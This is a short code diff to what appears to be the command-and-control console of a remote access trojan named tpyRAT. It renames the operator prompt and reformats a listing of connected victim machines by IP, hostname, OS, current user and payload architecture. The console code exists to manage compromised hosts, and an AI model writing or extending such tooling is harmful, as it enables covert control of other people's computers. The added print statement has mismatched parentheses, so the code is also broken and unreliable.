@@ -86,7 +86,7 @@ def accepting_connections():
 def start_turtle():
 
     while True:
-        cmd = input('turtle> ')
+        cmd = input('tpyRAT> ')
         if cmd == 'list':
             list_connections()
         elif 'session' in cmd:
@@ -116,7 +116,7 @@ def list_connections():
 
         results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
 
-    print("----Clients----" + "\n" + results)
+    print('%s %5s %25s %15s %40s %25s' % ('ID:', 'IP:', 'HOSTNAME:', 'OS:', 'CURRENT_USER:', 'PAYLOAD_ARCH:')) + '\n' + results)
 
 
 # Selecting the target
